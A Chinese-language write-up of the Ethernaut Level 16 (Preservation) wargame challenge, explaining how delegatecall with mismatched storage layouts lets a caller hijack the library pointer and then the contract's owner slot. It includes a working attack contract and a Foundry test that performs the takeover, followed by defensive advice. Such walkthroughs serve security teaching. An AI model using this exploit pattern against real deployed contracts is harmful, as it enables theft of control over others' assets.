---
title: 'Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵'
date: 2025-01-25 16:25:00
updated: 2025-01-25 16:25:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - delegatecall
  - Storage Layout
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "深入剖析 `delegatecall` 的危险性以及存储布局不匹配如何导致致命漏洞。通过两次 `delegatecall` 调用，完全控制目标合约的 `owner`，掌握 Preservation 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵

> **关卡链接**: [Ethernaut Level 16 - Preservation](https://ethernaut.openzeppelin.com/level/16)  
> **攻击类型**: `delegatecall` 存储布局操纵  
> **难度**: ⭐⭐⭐⭐☆

## 📋 挑战目标

本关的目标是获取 `Preservation` 合约的所有权，即成为该合约的 `owner`。

![Preservation Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg)

## 🔍 漏洞分析

`Preservation` 合约的 `owner` 是私有的，并且没有直接的函数来修改它。漏洞隐藏在使用 `delegatecall` 的 `setFirstTime` 和 `setSecondTime` 函数中。

```solidity
contract Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    // ... constructor ...

    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256("setTime(uint256)")), _timeStamp));
    }

    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256("setTime(uint256)")), _timeStamp));
    }
}
```

`delegatecall` 是一个非常危险的操作码。它会在调用者合约的上下文中执行另一个合约的代码。这意味着，被调用合约（`library`）的代码可以修改调用者合约（`Preservation`）的存储。

当 `setFirstTime` 通过 `delegatecall` 调用 `timeZone1Library` 的 `setTime` 函数时，`setTime` 函数修改的存储槽位是 `Preservation` 合约的槽位。

让我们比较一下 `Preservation` 和 `LibraryContract` 的存储布局：

| Slot | `Preservation` 合约 | `LibraryContract` 合约 |
| :--- | :------------------ | :--------------------- |
| 0    | `timeZone1Library`  | `storedTime`           |
| 1    | `timeZone2Library`  | (未使用)               |
| 2    | `owner`             | (未使用)               |
| 3    | `storedTime`        | (未使用)               |

当 `LibraryContract.setTime(uint)` 被 `delegatecall` 调用时，它以为自己在修改 `storedTime`（位于 slot 0）。但实际上，它修改的是 `Preservation` 合约的 slot 0，也就是 `timeZone1Library` 的地址！

这就给了我们一个攻击路径：

1.  **第一次调用 `setFirstTime`**: 我们传入一个精心构造的 `_timeStamp`，这个 `_timeStamp` 其实是我们的攻击合约的地址。这次调用会把 `Preservation` 合约的 `timeZone1Library` (slot 0) 修改为我们的攻击合约地址。
2.  **创建攻击合约**: 我们的攻击合约需要有一个 `setTime(uint)` 函数。但是，这个函数的实现不是为了设置时间，而是为了修改 `owner`。为了能修改 `owner`（位于 slot 2），我们的攻击合约需要有与 `Preservation` 相似的存储布局，使得 `owner` 变量也位于 slot 2。
3.  **第二次调用 `setFirstTime`**: 现在 `timeZone1Library` 已经指向我们的攻击合约。我们再次调用 `setFirstTime`，这次传入我们自己的地址（`player`）作为 `_timeStamp`。`delegatecall` 会执行我们攻击合约的 `setTime` 函数，该函数会将传入的 `_timeStamp` (我们的地址) 写入 `owner` 变量（slot 2），从而使我们成为 `owner`。

## 💻 Foundry 实现

### 攻击合约代码

攻击合约的存储布局必须与 `Preservation` 兼容，至少在前三个槽位上是这样。它的 `setTime` 函数被设计用来修改 `owner`。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 攻击合约
contract Attack {
    // 保持与 Preservation 合约相同的存储布局
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // 这个函数签名必须与库函数匹配
    // 但实现是恶意的
    function setTime(uint256 _newOwner) public {
        // 当被 delegatecall 调用时，它会修改 Preservation 合约的 slot 2
        owner = address(uint160(_newOwner));
    }
}
```

### Foundry 测试代码

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/16_Preservation.sol";

// 攻击合约定义 (同上)
contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    function setTime(uint256 _newOwner) public { owner = address(uint160(_newOwner)); }
}

contract PreservationTest is Test {
    Preservation instance;
    Attack attackContract;
    address player;

    function setUp() public {
        player = vm.addr(1);
        
        // 部署目标合约和攻击合约
        LibraryContract lib = new LibraryContract();
        instance = new Preservation(address(lib), address(lib));
        attackContract = new Attack();
    }

    function testAttacker() public {
        vm.startPrank(player, player);

        // 步骤 1: 将 timeZone1Library (slot 0) 修改为攻击合约的地址
        instance.setFirstTime(uint256(uint160(address(attackContract))));
        
        // 验证 timeZone1Library 是否已更改
        assertEq(instance.timeZone1Library(), address(attackContract));

        // 步骤 2: 再次调用 setFirstTime，这次会执行攻击合约的 setTime 函数
        // 将 owner (slot 2) 修改为 player 的地址
        instance.setFirstTime(uint256(uint160(player)));

        // 验证 owner 是否已更改
        assertEq(instance.owner(), player);

        vm.stopPrank();
    }
}
```

### 关键攻击步骤

1.  **部署攻击合约**: 创建一个具有恶意 `setTime` 函数和兼容存储布局的攻击合约。
2.  **第一次 `setFirstTime` 调用**: 调用 `setFirstTime`，参数为攻击合约的地址。这会劫持 `timeZone1Library` 指针。
3.  **第二次 `setFirstTime` 调用**: 再次调用 `setFirstTime`，参数为 `player` 的地址。这会执行攻击合约的代码，将 `player` 的地址写入 `Preservation` 合约的 `owner` 存储槽。

## 🛡️ 防御措施

1.  **使用 `library` 关键字**: Solidity 的 `library` 类型是专门为此类功能设计的。库是无状态的，并且不能被 `delegatecall` 直接调用来修改状态（除非使用了特定的技巧）。它们可以防止存储布局冲突。
2.  **确保兼容的存储布局**: 如果你必须使用 `delegatecall` 到一个非库合约，请务必确保两个合约具有完全相同且兼容的存储布局。任何差异都可能导致严重的安全漏洞。
3.  **不要将 `delegatecall` 暴露给用户输入**: 避免让用户控制 `delegatecall` 的目标地址或参数。`delegatecall` 应该只用于与受信任和经过验证的代码进行交互。
4.  **使用 `call` 而不是 `delegatecall`**: 如果只是想调用另一个合约的函数，而不需要在当前合约的上下文中执行，请使用标准的 `call`。`call` 会在被调用合约自己的上下文中执行，不会影响调用者的存储。

## 🔧 相关工具和技术

-   **`delegatecall`**: EVM 中最强大的操作码之一，也是最危险的。它允许代码重用，但也带来了存储操纵的风险。
-   **存储布局 (Storage Layout)**: 理解Solidity如何将变量存储在EVM的存储槽中是高级智能合约安全分析的基础。`forge inspect <Contract> storage-layout` 是一个非常有用的工具。
-   **类型转换**: 将 `address` 转换为 `uint` 是本次攻击的关键。`uint256(uint160(address))` 是实现这一点的标准方法。

## 🎯 总结

**核心概念**:
-   `delegatecall` 在调用者的上下文中执行代码，这意味着它可以修改调用者的存储。
-   当调用者和被调用者的存储布局不匹配时，`delegatecall` 会导致意想不到的、灾难性的状态损坏。
-   合约的存储槽是按顺序分配的，了解这个顺序是预测 `delegatecall` 影响的关键。

**攻击向量**:
-   利用 `delegatecall` 和不匹配的存储布局来覆盖合约的关键状态变量（如指针或所有者地址）。
-   通过两步攻击，首先劫持代码执行流（通过覆盖库地址），然后执行恶意代码来获取权限。

**防御策略**:
-   严格限制 `delegatecall` 的使用。
-   优先使用 `library` 关键字来创建无状态的辅助合约。
-   确保 `delegatecall` 的目标合约具有兼容的存储布局。

## 📚 参考资料

-   [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries)
-   [Consensys: Delegatecall Vulnerabilities](https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/)